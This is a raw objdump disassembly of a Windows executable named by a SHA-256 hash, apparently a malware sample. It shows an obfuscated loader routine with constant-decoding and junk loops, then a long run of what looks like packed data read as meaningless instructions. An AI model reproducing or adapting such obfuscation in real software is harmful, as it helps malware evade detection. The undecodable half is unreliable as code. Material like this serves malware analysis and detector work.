
389cb147a9ea8a56eb5094e0cd49e004fbabbab0f14bcba65e56a0e6471ccb69.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x42fa00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x42fa04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x42fa08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x42fa0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x42fa38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x42fa3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x42fa40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x42fa10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x42fa14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0x1364c454
  40157e:	aam    0x83
  401580:	jnp    0x4015fd
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [ecx-0x75747576],ebp
  401599:	mov    bl,0x22
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x2d5c06c4],0x8f
  40162d:	sbb    al,BYTE PTR [esi+0x21]
  401630:	shr    BYTE PTR [ebx-0x5142beb6],0xb7
  401637:	test   eax,0x8d5eef82
  40163c:	mov    dh,BYTE PTR [ebp+0x7e]
  40163f:	xchg   edx,eax
  401640:	jbe    0x4016a0
  401642:	mov    bl,0x84
  401644:	mov    BYTE PTR [ebx],bh
  401646:	mov    bl,BYTE PTR [eiz*1-0x4ddf3ac4]
  40164d:	dec    edx
  40164e:	mov    eax,ds:0x4d50967a
  401653:	out    0xaa,eax
  401655:	jg     0x4016cc
  401657:	jle    0x4015f6
  401659:	fnstenv [edx+0x2b]
  40165c:	cli    
  40165d:	jnp    0x401628
  40165f:	sbb    bh,dh
  401661:	sahf   
  401662:	mov    al,ds:0xe08927a3
  401667:	and    al,0x46
  401669:	jecxz  0x4016e4
  40166b:	test   DWORD PTR [edi+0x5f],ecx
  40166e:	sub    DWORD PTR [ebp+0x6d1fc5b1],0x44
  401675:	mov    ebx,0x8a9f65af
  40167a:	mov    ecx,0x94372cb7
  40167f:	push   edi
  401680:	jmp    0x8629:0x8d7a1b2c
  401687:	scas   al,BYTE PTR es:[edi]
  401688:	aad    0xb0
  40168a:	adc    BYTE PTR [edx-0x2b],ah
  40168d:	adc    eax,DWORD PTR [ecx+esi*8]
  401690:	in     al,0xf0
  401692:	cmp    al,al
  401694:	lods   al,BYTE PTR ds:[esi]
  401695:	scas   al,BYTE PTR es:[edi]
  401696:	pushf  
  401697:	dec    ecx
  401698:	jle    0x40162d
  40169a:	icebp  
  40169b:	dec    edi
  40169c:	xor    ch,bl
  40169e:	scas   eax,DWORD PTR es:[edi]
  40169f:	fwait
  4016a0:	(bad)  
  4016a1:	int    0xe5
  4016a3:	adc    eax,0x3d174f41
  4016a8:	sbb    ecx,DWORD PTR [edi-0x1]
  4016ab:	fstp   DWORD PTR [edx]
  4016ad:	sbb    al,0x77
  4016af:	add    eax,0x7950d490
  4016b4:	push   eax
  4016b5:	jbe    0x401678
  4016b7:	sub    eax,DWORD PTR [eax+0x3f965e56]
  4016bd:	mov    DWORD PTR [ecx+0x46],edx
  4016c0:	fisttp QWORD PTR [edx]
  4016c2:	popf   
  4016c3:	xor    al,0x48
  4016c5:	imul   esi,DWORD PTR [ebx-0x72],0x3fbf09ac
  4016cc:	pop    edx
  4016cd:	push   0xffffffd7
  4016cf:	fsub   DWORD PTR [edx+0x6a994e3f]
  4016d5:	adc    WORD PTR [ebx],bp
  4016d8:	pop    es
  4016d9:	mov    esp,0x4a8b76f8
  4016de:	dec    esp
  4016df:	and    bl,BYTE PTR [edx+0x5e]
  4016e2:	jge    0x401728
  4016e4:	xor    BYTE PTR [eax],ah
  4016e6:	mov    WORD PTR [eax],gs
  4016e8:	jle    0x401696
  4016ea:	scas   eax,DWORD PTR es:[edi]
  4016eb:	adc    cl,bl
  4016ed:	bnd jns 0x4016f6
  4016f0:	pusha  
  4016f1:	mov    esp,0xc69ec34a
  4016f6:	mov    ch,0x6a
  4016f8:	jns    0x401709
  4016fa:	mov    ebp,0x89e104ce
  4016ff:	test   BYTE PTR ss:[ebp+eiz*8+0x46afd6b2],bh
  401707:	jbe    0x4016b9
  401709:	mov    esp,0x380b186e
  40170e:	xchg   DWORD PTR [esi],esp
  401710:	mov    dl,0xd6
  401712:	pushf  
  401713:	in     al,dx
  401714:	popa   
  401715:	inc    esp
  401716:	sbb    al,0x84
  401718:	and    al,0x62
  40171a:	mov    bh,0x11
  40171c:	mov    ds:0x3604f115,al
  401721:	xor    al,0x8d
  401723:	sbb    edi,DWORD PTR [esp+eax*2-0x1323451]
  40172a:	call   0xea78:0x9289978e
  401731:	mov    eax,ds:0x7d5ae6a9
  401736:	(bad)  
  401737:	aam    0xb3
  401739:	sbb    BYTE PTR [edx-0xe],ch
  40173c:	in     eax,0x75
  40173e:	ss jecxz 0x4016cc
  401741:	push   edx
  401742:	int3   
  401743:	dec    esp
  401744:	(bad)  
  401745:	cmc    
  401746:	mov    esi,0xa4906988
  40174b:	ja     0x4016df
  40174d:	icebp  
  40174e:	push   edx
  40174f:	add    ch,ah
  401751:	add    DWORD PTR [esi],ebp
  401753:	xchg   edx,eax
  401754:	jne    0x401792
  401756:	out    dx,al
  401757:	test   BYTE PTR [esi-0x86b39c3],ah
  40175d:	loope  0x401791
  40175f:	and    esp,DWORD PTR [edx+eiz*1]
  401762:	popa   
  401763:	data16 or BYTE PTR [edx],al
  401766:	push   edx
  401767:	xchg   esp,eax
  401768:	loope  0x401724
  40176a:	push   eax
  40176b:	jle    0x4017e7
  40176d:	(bad)  
  40176e:	in     eax,dx
  40176f:	xor    ebp,ebp
  401771:	mov    WORD PTR ds:0xdf9847cf,cs
  401777:	add    eax,0x748556b1
  40177c:	(bad)  
  40177d:	outs   dx,DWORD PTR ds:[esi]
  40177e:	sbb    BYTE PTR [ecx+0x61],0x9e
  401782:	sub    BYTE PTR [eax+ebx*8-0x6ace4aa8],cl
  401789:	int3   
  40178a:	mov    al,ds:0xb4ac4199
  40178f:	mov    al,ds:0xa376687f
  401794:	mov    ebp,0x7112bf24
  401799:	push   0x2e6f2345
  40179e:	adc    al,0x3d
  4017a0:	add    ch,ah
  4017a2:	jle    0x4017d4
  4017a4:	sbb    dl,dh
  4017a6:	cmc    
  4017a7:	in     eax,0x76
  4017a9:	jb     0x4017a6
  4017ab:	sbb    esi,DWORD PTR [eax]
  4017ad:	xchg   esi,eax
  4017ae:	imul   esp,DWORD PTR [ebp-0xa],0xc94f9fc6
  4017b5:	jmp    0xc04c:0x362017d7
  4017bc:	aam    0x81
  4017be:	hlt    
  4017bf:	or     eax,DWORD PTR [ecx]
  4017c1:	inc    esp
  4017c2:	(bad)  
  4017c3:	dec    esi
  4017c4:	jbe    0x40179a
  4017c6:	and    ecx,DWORD PTR [esi+edi*8-0x60771f49]
  4017cd:	pop    ebp
  4017ce:	stos   BYTE PTR es:[edi],al
  4017cf:	sahf   
  4017d0:	and    eax,0x9fed705c
  4017d5:	pop    edx
  4017d6:	test   al,0xf3
  4017d8:	ds jno 0x4017c0
  4017db:	loopne 0x401817
  4017dd:	jne    0x401846
  4017df:	jp     0x4017be
  4017e1:	test   DWORD PTR [eax],esp
  4017e3:	jl     0x40178a
  4017e5:	and    eax,0x6228aebf
  4017ea:	ret    0x7f4c
  4017ed:	sahf   
  4017ee:	xchg   ebp,eax
  4017ef:	test   dl,dh
  4017f1:	pop    ebx
  4017f2:	cwde   
  4017f3:	dec    edx
  4017f4:	repnz sub bl,al
  4017f7:	test   al,0x30
  4017f9:	es dec esi
  4017fb:	mov    edx,0xb6f3cc57
  401800:	in     al,dx
  401801:	(bad)
  401804:	call   0xdc7a0bac
  401809:	jge    0x40185d
  40180b:	dec    edi
  40180c:	ficom  DWORD PTR [esi-0x7]
  40180f:	xchg   edx,eax
  401810:	pop    es
  401811:	ret    0xf18d
  401814:	push   es
  401815:	mov    bl,0x49
  401817:	push   ds
  401818:	jp     0x401850
  40181a:	jmp    0x40187a
  40181c:	or     al,0x43
  40181e:	(bad)  
  40181f:	fstp   DWORD PTR [edx-0x6ca4320c]
  401825:	xor    BYTE PTR [edi+ebx*4+0x14],dl
  401829:	outs   dx,BYTE PTR ss:[esi]
  40182b:	add    edx,edi
  40182d:	pop    ebp
  40182e:	xchg   ebx,eax
  40182f:	mov    dl,BYTE PTR [esi+0x7c]
  401832:	xchg   edi,eax
  401833:	fist   DWORD PTR [edx+0x37fc5751]
  401839:	mov    ecx,0xd95a9330
  40183e:	dec    esp
  40183f:	call   0xc11d8176
  401844:	popf   
  401845:	repz xchg esi,eax
  401847:	enter  0xf001,0x23
  40184b:	or     BYTE PTR [ebx],0xcf
  40184e:	xchg   edi,eax
  40184f:	jmp    0xf439:0xd4a2c73f
  401856:	sbb    ah,dh
  401858:	sub    al,bl
  40185a:	js     0x401800
  40185c:	xor    DWORD PTR [ecx+0x5d6590a1],ebx
  401862:	mov    esp,0xe23e4bf3
  401867:	fnstcw WORD PTR [ebp+0x7df75d53]
  40186d:	test   DWORD PTR [ebp-0x1b],0x97366c16
  401874:	or     esi,DWORD PTR cs:[eax+eax*4-0x1c]
  401879:	out    0x55,eax
  40187b:	fist   DWORD PTR ds:[ecx]
  40187e:	pop    eax
  40187f:	cmc    
  401880:	sub    bl,BYTE PTR [ebp+0x19e35f89]
  401886:	xchg   edi,eax
  401887:	iret   
  401888:	mov    eax,ds:0xc4f81a43
  40188d:	int3   
  40188e:	push   ds
  40188f:	jb     0x401908
  401891:	retf   0xc64e
  401894:	imul   ecx,DWORD PTR ds:0x62caaf,0x4c
  40189b:	dec    ecx
  40189c:	and    BYTE PTR [edi],ah
  40189e:	je     0x401858
  4018a0:	cmc    
  4018a1:	fs mov ebx,0x3ce2758a
  4018a7:	mov    ds:0x4d99aff6,al
  4018ac:	fistp  WORD PTR [edx-0x1b]
  4018af:	loopne 0x401847
  4018b1:	shl    DWORD PTR [edi],1
  4018b3:	cli    
  4018b4:	pop    ebp
  4018b5:	int3   
  4018b6:	inc    ebp
  4018b7:	nop
  4018b8:	popa   
  4018b9:	lds    edx,FWORD PTR [edi+0x37]
  4018bc:	je     0x4018bd
  4018be:	and    eax,0xba05a8ae
  4018c3:	mov    DWORD PTR [ebx+ebp*1],esi
  4018c6:	xchg   esp,eax
  4018c7:	mul    BYTE PTR [esi-0x1a]
  4018ca:	cmp    edx,esp
  4018cc:	mov    ecx,0xf556b2ec
  4018d1:	test   eax,0xc3aa26e8
  4018d6:	cmp    eax,0xa192d364
  4018dc:	push   edi
  4018dd:	lahf   
  4018de:	retf   
  4018df:	aam    0x4e
  4018e1:	fild   WORD PTR [edi-0x6e]
  4018e4:	mov    al,ds:0x18586385
  4018e9:	or     edx,DWORD PTR [ebx-0x5c]
  4018ec:	sbb    BYTE PTR [ecx-0x4cb8632a],0xf2
  4018f3:	scas   al,BYTE PTR es:[edi]
  4018f4:	add    esp,ecx
  4018f6:	fisttp WORD PTR [ebx]
  4018f8:	or     ch,bh
  4018fa:	je     0x4018d0
  4018fc:	xor    al,0x23
  4018fe:	retf   0xe4a7
  401901:	jg     0x40188a
  401903:	fwait
  401904:	pop    esp
  401905:	outs   dx,DWORD PTR ds:[esi]
  401906:	mov    edi,0x42334e89
  40190b:	sub    bl,dh
  40190d:	mov    eax,0xf1ca941
  401912:	ds daa 
  401914:	mov    dl,0x44
  401916:	dec    edx
  401917:	mov    eax,ss:0xa833f507
  40191d:	xchg   ecx,eax
  40191e:	iret   
  40191f:	dec    ebx
  401920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401921:	sbb    DWORD PTR [edx-0x4e],esp
  401924:	je     0x4018e4
  401926:	xor    BYTE PTR [edx],bl
  401928:	mov    gs,esi
  40192a:	cld    
  40192b:	push   cs
  40192c:	iret   
  40192d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40192e:	fld    QWORD PTR [ebp+0x1d9966cb]
  401934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401935:	shr    DWORD PTR [ebx-0x6d],cl
  401938:	cmp    edi,DWORD PTR [edi-0xa80939a]
  40193e:	jo     0x40196c
  401940:	jmp    0x40193b
  401942:	retf   0x5a8f
  401945:	jle    0x40193a
  401947:	jle    0x4019c8
  401949:	loop   0x4019a9
  40194b:	inc    esi
  40194c:	jge    0x40190a
  40194e:	out    dx,al
  40194f:	push   ds
  401950:	push   ebp
  401951:	mov    WORD PTR [esi-0x61934369],gs
  401957:	das    
  401958:	stos   DWORD PTR es:[edi],eax
  401959:	stc    
  40195a:	mov    ecx,ebp
  40195c:	icebp  
  40195d:	mov    edx,0x52e6ce00
  401962:	xchg   ebx,eax
  401963:	fistp  DWORD PTR [esi+0x5c]
  401966:	loopne 0x401928
  401968:	cmp    DWORD PTR [edi+0x75cdc130],edi
  40196e:	ins    DWORD PTR es:[edi],dx
  40196f:	test   al,0xff
  401971:	mov    WORD PTR [edi-0x761657eb],?
  401977:	repnz popf 
  401979:	inc    esi
  40197a:	(bad)  
  40197b:	in     eax,0x2d
  40197d:	inc    ebx
  40197e:	jmp    FWORD PTR [edx-0x720974ea]
  401984:	cwde   
  401985:	sub    esp,DWORD PTR [ebx+0x3b]
  401988:	jne    0x401949
  40198a:	ret    
  40198b:	sub    cl,BYTE PTR [eax+0x42922520]
  401991:	pop    edx
  401992:	clc    
  401993:	push   cs
  401994:	or     DWORD PTR [edi-0x7d41c299],edi
  40199a:	mov    ebp,DWORD PTR [eax-0x6d15004c]
  4019a0:	out    0x3a,eax
  4019a2:	sbb    al,0xc1
  4019a4:	pop    esp
  4019a5:	rol    DWORD PTR [eax-0x29e11583],1
  4019ab:	retf   
  4019ac:	dec    esi
  4019ad:	aad    0x38
  4019af:	sti    
  4019b0:	enter  0x9c15,0xd7
  4019b4:	dec    ebx
  4019b5:	ja     0x401a02
  4019b7:	data16 loope 0x401a27
  4019ba:	mov    ds:0xa551dc72,al
  4019bf:	and    DWORD PTR ds:0x19466552,eax
  4019c5:	(bad)  [esi]
  4019c7:	popf   
  4019c8:	or     ah,0xce
  4019cb:	jae    0x401a22
  4019cd:	ins    DWORD PTR es:[edi],dx
  4019ce:	stos   DWORD PTR es:[edi],eax
  4019cf:	dec    ebp
  4019d0:	mov    esp,0xb05f92a0
  4019d5:	fucomp st(1)
  4019d7:	pop    ds
  4019d8:	inc    ebx
  4019d9:	jbe    0x401a42
  4019db:	int    0x14
  4019dd:	rcl    BYTE PTR [edi],1
  4019df:	mov    ds:0x9d794ea7,al
  4019e4:	jl     0x4019b7
  4019e6:	mov    bh,0xff
  4019e8:	imul   eax,ebx,0xe8c33ad2
  4019ee:	mov    cl,dh
  4019f0:	xchg   esi,eax
  4019f1:	daa    
  4019f2:	mov    cs,WORD PTR [esi-0x50a3f83c]
  4019f8:	sbb    bl,dl
  4019fa:	retf   
  4019fb:	push   ds
  4019fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019fd:	cmp    DWORD PTR [esi],0xe5bdd12b
  401a03:	mov    WORD PTR [edi+0x34c94fe7],ds
  401a09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a0a:	dec    ecx
  401a0b:	out    dx,eax
  401a0c:	mov    gs,esi
  401a0e:	std    
  401a0f:	dec    edx
  401a10:	mov    ebp,0x290c4372
  401a15:	pop    edx
